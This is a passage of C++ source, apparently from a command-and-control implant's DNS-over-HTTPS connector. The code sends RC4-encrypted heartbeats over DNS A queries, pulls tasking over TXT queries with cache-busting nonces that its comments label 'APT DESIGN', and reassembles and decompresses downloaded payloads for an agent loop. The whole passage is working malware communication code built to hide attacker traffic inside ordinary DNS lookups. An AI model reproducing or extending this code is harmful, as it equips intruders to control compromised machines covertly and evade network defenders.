			ackData[2] = (BYTE)((this->downAckOffset >> 8) & 0xFF);
			ackData[3] = (BYTE)((this->downAckOffset >> 0) & 0xFF);
			// hbNonce (big-endian)
			ackData[4] = (BYTE)((ackNonce >> 24) & 0xFF);
			ackData[5] = (BYTE)((ackNonce >> 16) & 0xFF);
			ackData[6] = (BYTE)((ackNonce >> 8) & 0xFF);
			ackData[7] = (BYTE)((ackNonce >> 0) & 0xFF);
			// ackTaskNonce (big-endian) - to identify which task is being ACKed
			ackData[8] = (BYTE)((this->downTaskNonce >> 24) & 0xFF);
			ackData[9] = (BYTE)((this->downTaskNonce >> 16) & 0xFF);
			ackData[10] = (BYTE)((this->downTaskNonce >> 8) & 0xFF);
			ackData[11] = (BYTE)((this->downTaskNonce >> 0) & 0xFF);
			CHAR ackLabel[32]; // Increased for 12 bytes base32 encoded
			memset(ackLabel, 0, sizeof(ackLabel));
			DnsBase32Encode(ackData, 12, ackLabel, sizeof(ackLabel));
			
			CHAR ackQname[256];
			DnsBuildQName(this->sid, "hb", ++this->seq, this->idx, ackLabel, this->domain, ackQname, sizeof(ackQname));
			BYTE tmp[16];
			ULONG tmpSize = 0;
			DohQueryA(ackQname, tmp, sizeof(tmp), &tmpSize);
			// NOTE: Do NOT reset downAckOffset here! Keep it so subsequent HB requests
			// continue to carry the ACK until server confirms (no_tasks) or new task starts.
		}
		return;
	}

	// -------------------------------------------------------------------------
	// 3. HI retry path when no explicit data is provided
	// -------------------------------------------------------------------------
	if (!this->hiSent && this->hiBeat && this->hiBeatSize && this->hiRetries > 0) {
		// Backoff: only attempt HI retry when the scheduled time has passed
		if (this->hiRetryDelayMs && this->hiNextAttemptTick) {
			ULONG now = GetTickCount();
			if (now < this->hiNextAttemptTick) {
				return;
			}
		}

		const ULONG maxSafeFrame = 100;
		ULONG retrySize = this->hiBeatSize;
		if (retrySize > maxSafeFrame)
			retrySize = maxSafeFrame;
		BYTE* encBuf = (BYTE*)MemAllocLocal(retrySize);
		if (!encBuf)
			return;
		memcpy(encBuf, this->hiBeat, retrySize);
		memset(dataLabel, 0, sizeof(dataLabel));
		if (!DnsBuildDataLabels(encBuf, retrySize, this->labelSize, dataLabel, sizeof(dataLabel))) {
			MemFreeLocal((LPVOID*)&encBuf, retrySize);
			return;
		}
		MemFreeLocal((LPVOID*)&encBuf, retrySize);

		ULONG wireSeq = DnsBuildWireSeq(this->seq, kDnsSignalBitsDoH);
		DnsBuildQName(this->sid, "www", wireSeq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
		BYTE tmp[512];
		ULONG tmpSize = 0;
		if (DohQueryTxt(qname, tmp, sizeof(tmp), &tmpSize)) {
			this->hiSent = TRUE;
			this->hiRetryDelayMs = 0;
			this->hiNextAttemptTick = 0;
		}
		else if (this->hiRetries > 0) {
			this->hiRetries--;
			if (this->hiRetries > 0) {
				if (this->hiRetryDelayMs == 0) {
					this->hiRetryDelayMs = 1000; // start with 1s
				}
				else {
					ULONG next = this->hiRetryDelayMs * 2;
					if (next > 300000) // cap at 5 minutes
						next = 300000;
					this->hiRetryDelayMs = next;
				}
				this->hiNextAttemptTick = GetTickCount() + this->hiRetryDelayMs;
			}
		}
		return;
	}

	// -------------------------------------------------------------------------
	// 4. Normal GET: heartbeat + downlink pull.
	// -------------------------------------------------------------------------
	// Heartbeat A-query when there is no in-progress downlink buffer AND no pending tasks.
	// This mirrors ConnectorDNS::SendData hybrid A/TXT behavior:
	//  - A(0.0.0.0) -> no tasks, return and let AgentMain sleep
	//  - A(0.0.0.1) -> has tasks, set hasPendingTasks and return to trigger burst
	// If hasPendingTasks=TRUE, skip heartbeat and go directly to GET logic.
	// ACK mechanism: encode downAckOffset and downTaskNonce to tell server which task/offset is confirmed.
	// HB data format: [ackOffset:4][hbNonce:4][ackTaskNonce:4] = 12 bytes
	if (!this->downBuf && !this->hasPendingTasks) {
		CHAR qnameA[512];
		// APT: Include ack_offset, hbNonce (cache bust), and ackTaskNonce (to identify which task is being ACKed)
		ULONG hbNonce = GetTickCount() ^ (this->seq * 7919);
		BYTE hbData[12];
		// ackOffset (big-endian)
		hbData[0] = (BYTE)((this->downAckOffset >> 24) & 0xFF);
		hbData[1] = (BYTE)((this->downAckOffset >> 16) & 0xFF);
		hbData[2] = (BYTE)((this->downAckOffset >> 8) & 0xFF);
		hbData[3] = (BYTE)((this->downAckOffset >> 0) & 0xFF);
		// hbNonce (big-endian) - for cache busting
		hbData[4] = (BYTE)((hbNonce >> 24) & 0xFF);
		hbData[5] = (BYTE)((hbNonce >> 16) & 0xFF);
		hbData[6] = (BYTE)((hbNonce >> 8) & 0xFF);
		hbData[7] = (BYTE)((hbNonce >> 0) & 0xFF);
		// ackTaskNonce (big-endian) - to identify which task is being ACKed
		hbData[8] = (BYTE)((this->downTaskNonce >> 24) & 0xFF);
		hbData[9] = (BYTE)((this->downTaskNonce >> 16) & 0xFF);
		hbData[10] = (BYTE)((this->downTaskNonce >> 8) & 0xFF);
		hbData[11] = (BYTE)((this->downTaskNonce >> 0) & 0xFF);
		// RC4 encrypt HB data before Base32 encoding
		EncryptRC4(hbData, 12, this->encryptKey, 16);
		CHAR hbLabel[32]; // Increased size for 12 bytes base32 encoded
		memset(hbLabel, 0, sizeof(hbLabel));
		DnsBase32Encode(hbData, 12, hbLabel, sizeof(hbLabel));
		ULONG hbSeqLogical = this->seq + 1;
		ULONG hbWireSeq = DnsBuildWireSeq(hbSeqLogical, kDnsSignalBitsDoH);
		DnsBuildQName(this->sid, "hb", hbWireSeq, this->idx, hbLabel, this->domain, qnameA, sizeof(qnameA));
		BYTE ipBuf[16];
		ULONG ipSize = 0;
		if (DohQueryA(qnameA, ipBuf, sizeof(ipBuf), &ipSize) && ipSize >= 4) {
			if (ipBuf[0] == 0 && ipBuf[1] == 0 && ipBuf[2] == 0 && ipBuf[3] == 0) {
				// No tasks: advance seq and return immediately.
				this->seq++;
				// 重置 ACK offset 因为没有待下载的任务
				this->downAckOffset = 0;
				this->hasPendingTasks = FALSE;
				return;
			}
			// 有任务，标记 pending 以触发 burst 模式
			// CRITICAL: 设置 hasPendingTasks 后立即返回，不要在同一个 SendData 中执行 GET
			// 这样 MainAgent 才能在下一轮循环检查 IsBusy() 并进入 burst 模式
			this->hasPendingTasks = TRUE;
			this->seq++;
			return;
		} else {
			// A-record heartbeat failed; skip TXT this round and retry later.
			return;
		}
	}

	// APT DESIGN: Include offset AND nonce in query to prevent ALL DNS caching
	ULONG reqOffset = this->downFilled;
	ULONG nonce = GetTickCount() ^ (this->seq << 16) ^ (reqOffset * 31337);
	
	BYTE reqData[8];
	reqData[0] = (BYTE)((reqOffset >> 24) & 0xFF);
	reqData[1] = (BYTE)((reqOffset >> 16) & 0xFF);
	reqData[2] = (BYTE)((reqOffset >> 8) & 0xFF);
	reqData[3] = (BYTE)((reqOffset >> 0) & 0xFF);
	reqData[4] = (BYTE)((nonce >> 24) & 0xFF);
	reqData[5] = (BYTE)((nonce >> 16) & 0xFF);
	reqData[6] = (BYTE)((nonce >> 8) & 0xFF);
	reqData[7] = (BYTE)((nonce >> 0) & 0xFF);
	// RC4 encrypt GET query data
	EncryptRC4(reqData, 8, this->encryptKey, 16);
	CHAR reqLabel[24];
	memset(reqLabel, 0, sizeof(reqLabel));
	DnsBase32Encode(reqData, 8, reqLabel, sizeof(reqLabel));
	
	DnsBuildQName(this->sid, "api", ++this->seq, this->idx, reqLabel, this->domain, qname, sizeof(qname));
	BYTE respBuf[4096];
	ULONG respSize = 0;
	if (DohQueryTxt(qname, respBuf, sizeof(respBuf), &respSize) && respSize > 0) {
		// Simple ACK path
		if (respSize == 2 && respBuf[0] == 'O' && respBuf[1] == 'K') {
			return;
		}

		// Base64 decode the TXT response into binary chunk
		BYTE binBuf[4096];
		int binLen = DnsBase64Decode((const CHAR*)respBuf, (int)respSize, binBuf, (int)sizeof(binBuf));
		if (binLen <= 0) {
			// Server may have restarted and lost task state
			// Abort current download so next heartbeat can re-check for tasks
			if (this->downBuf) {
				MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
				this->downBuf = NULL;
				this->downTotal = 0;
				this->downFilled = 0;
				this->downAckOffset = 0;
			}
			return;
		}

		// RC4 decrypt the response after Base64 decoding
		DecryptRC4(binBuf, binLen, this->encryptKey, 16);

		const ULONG headerSize = 8;
		// New protocol: [total_len][offset] header in big-endian
		if (binLen > (int)headerSize) {
			ULONG total = 0;
			ULONG offset = 0;
			total |= ((ULONG)binBuf[0] << 24);
			total |= ((ULONG)binBuf[1] << 16);
			total |= ((ULONG)binBuf[2] << 8);
			total |= ((ULONG)binBuf[3] << 0);
			offset |= ((ULONG)binBuf[4] << 24);
			offset |= ((ULONG)binBuf[5] << 16);
			offset |= ((ULONG)binBuf[6] << 8);
			offset |= ((ULONG)binBuf[7] << 0);
			ULONG chunkLen = (ULONG)(binLen - (int)headerSize);
			const ULONG maxDownloadSize = 4u << 20; // 4MB
			if (total > 0 && total <= maxDownloadSize && offset < total) {
				// NEW DESIGN: Verify received offset matches what we requested.
				// Special case: if we requested offset>0 but got offset=0, this might be
				// a new task from server restart. Check taskNonce to decide.
				if (offset != reqOffset) {
					// If server returns offset=0 but we wanted offset>0, check if it's a new task
					if (offset == 0 && reqOffset > 0 && chunkLen >= 9) {
						ULONG newTaskNonce = 0;
						newTaskNonce |= (ULONG)binBuf[headerSize + 1];
						newTaskNonce |= ((ULONG)binBuf[headerSize + 2] << 8);
						newTaskNonce |= ((ULONG)binBuf[headerSize + 3] << 16);
						newTaskNonce |= ((ULONG)binBuf[headerSize + 4] << 24);
						
						if (newTaskNonce != 0 && newTaskNonce != this->downTaskNonce) {
							// Different taskNonce: Server restarted with new task, reset our state
							if (this->downBuf) {
								MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
							}
							this->downBuf = NULL;
							this->downTotal = 0;
							this->downFilled = 0;
							this->downAckOffset = 0;
							this->downTaskNonce = 0;
							// Don't return - let it fall through to process this as new task
						} else {
							// Same taskNonce or unknown: probably cached old response, discard
							return;
						}
					} else {
						return;
					}
				}
				
				// Check taskNonce from first chunk (offset=0) to detect new task
				// Frame format: [flags:1][taskNonce:4][origLen:4][payload]
				ULONG chunkTaskNonce = 0;
				if (offset == 0 && chunkLen >= 9) {
					// Parse taskNonce from chunk (little-endian, bytes 1-4)
					chunkTaskNonce |= (ULONG)binBuf[headerSize + 1];
					chunkTaskNonce |= ((ULONG)binBuf[headerSize + 2] << 8);
					chunkTaskNonce |= ((ULONG)binBuf[headerSize + 3] << 16);
					chunkTaskNonce |= ((ULONG)binBuf[headerSize + 4] << 24);
				}
				
				// Initialize buffer if needed (starting a NEW task)
				BOOL isNewTask = (!this->downBuf || this->downTotal != total);
				// Also check taskNonce: if nonce differs, it's a new task even if total is same
				if (!isNewTask && offset == 0 && chunkTaskNonce != 0 && chunkTaskNonce != this->downTaskNonce) {
					isNewTask = TRUE;
				}
				
				// CRITICAL: Reject cached replay of just-completed task
				// If downAckOffset > 0 (just completed a task) and taskNonce matches the old one,
				// this is likely a cache replaying the old task response. Ignore it.
				if (isNewTask && offset == 0 && chunkTaskNonce != 0 && 
				    chunkTaskNonce == this->downTaskNonce && this->downAckOffset > 0) {
					return; // Ignore this cached response
				}
				
				if (isNewTask) {
					// CRITICAL: If total or taskNonce changed, this is a NEW task
					// We must discard current chunk and restart from offset=0
					if (this->downBuf && this->downTotal) {
						MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
					}
					this->downBuf = (BYTE*)MemAllocLocal(total);
					if (!this->downBuf) {
						this->downTotal = 0;
						this->downFilled = 0;
						return;
					}
					this->downTotal = total;
					this->downFilled = 0;
					this->downAckOffset = 0; // Reset ACK offset for NEW task
					this->downTaskNonce = chunkTaskNonce; // Record new task nonce
					
					// If current chunk offset != 0, discard it and request from 0 next time
					if (offset != 0) {
						return; // Next SendData() will request offset=0
					}
				}

				// Copy chunk at the correct offset
				ULONG end = offset + chunkLen;
				if (end > total)
					end = total;
				ULONG n = end - offset;
				memcpy(this->downBuf + offset, binBuf + headerSize, n);
				
				// Update progress: since we request sequentially, downFilled = offset + n
				this->downFilled = offset + n;
				this->downAckOffset = this->downFilled;
				if (this->downFilled >= this->downTotal) {
					// Session header: [flags:1][taskNonce:4][origLen:4], followed by payload
					// Frame header size = 1 + 4 + 4 = 9 bytes
					const ULONG frameHeaderSize = 9;
					BYTE* finalBuf = this->downBuf;
					ULONG finalSize = this->downTotal;
					if (this->downTotal > frameHeaderSize) {
						BYTE flags = this->downBuf[0];
						// taskNonce at bytes 1-4 (already parsed earlier, skip here)
						// origLen at bytes 5-8 (little-endian)
						ULONG orig = 0;
						orig |= (ULONG)this->downBuf[5];
						orig |= ((ULONG)this->downBuf[6] << 8);
						orig |= ((ULONG)this->downBuf[7] << 16);
						orig |= ((ULONG)this->downBuf[8] << 24);

						if ((flags & 0x1) && orig > 0 && orig <= (4u << 20)) {
							BYTE* outBuf = NULL;
							if (DeflateDecompress(this->downBuf + frameHeaderSize, this->downTotal - frameHeaderSize, &outBuf, orig) && outBuf) {
								finalBuf = outBuf;
								finalSize = orig;
								MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
								this->downBuf = NULL;
							}
							else {
								MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
								this->downBuf = NULL;
								this->downTotal = 0;
								this->downFilled = 0;
								return;
							}
						}
						else if (flags == 0 && orig > 0 && orig <= this->downTotal - frameHeaderSize) {
							BYTE* outBuf = (BYTE*)MemAllocLocal(orig);
							if (outBuf) {
								memcpy(outBuf, this->downBuf + frameHeaderSize, orig);
								finalBuf = outBuf;
								finalSize = orig;
								MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
								this->downBuf = NULL;
							}
							else {
								MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
								this->downBuf = NULL;
								this->downTotal = 0;
								this->downFilled = 0;
								return;
							}
						}
					}

					this->recvData = finalBuf;
					this->recvSize = (int)finalSize;
					this->lastDownTotal = finalSize;
					// Keep downAckOffset = downTotal so next heartbeat ACKs completion!
					this->downAckOffset = this->downTotal; // Signal completion
					this->downBuf = NULL;
					this->downTotal = 0;
					this->downFilled = 0;
					this->hasPendingTasks = FALSE;
				}
				return;
			}
		}

		// Legacy path: no header, treat as single complete buffer
		this->recvData = (BYTE*)MemAllocLocal(binLen);
		if (!this->recvData)
			return;
		memcpy(this->recvData, binBuf, binLen);
		this->recvSize = binLen;
		this->lastDownTotal = (ULONG)binLen;
	}
}

BYTE* ConnectorDoH::RecvData() { return this->recvData; }
int ConnectorDoH::RecvSize() { return this->recvSize; }
void ConnectorDoH::RecvClear() { this->recvData = NULL; this->recvSize = 0; }

void ConnectorDoH::ReportProtocolResult(BOOL success)
{
	if (this->urlCount == 0)
		return;
	ULONG idx = this->currentUrlIndex;
	if (idx >= this->urlCount)
		idx = 0;
	if (success) {
		this->urlFailCount[idx] = 0;
		this->urlDisabledUntil[idx] = 0;
		return;
	}
	this->urlFailCount[idx]++;
	const ULONG max_fail = 2;
	if (this->urlFailCount[idx] >= max_fail) {
		ULONG backoff = 30000;
		ULONG jitter = GetTickCount() & 0x0FFF;
		this->urlDisabledUntil[idx] = GetTickCount() + backoff + jitter;
		this->urlFailCount[idx] = 0;
	}
}

BOOL ConnectorDoH::IsBusy() const
{
	return (this->downBuf != NULL) || this->hasPendingTasks;
}
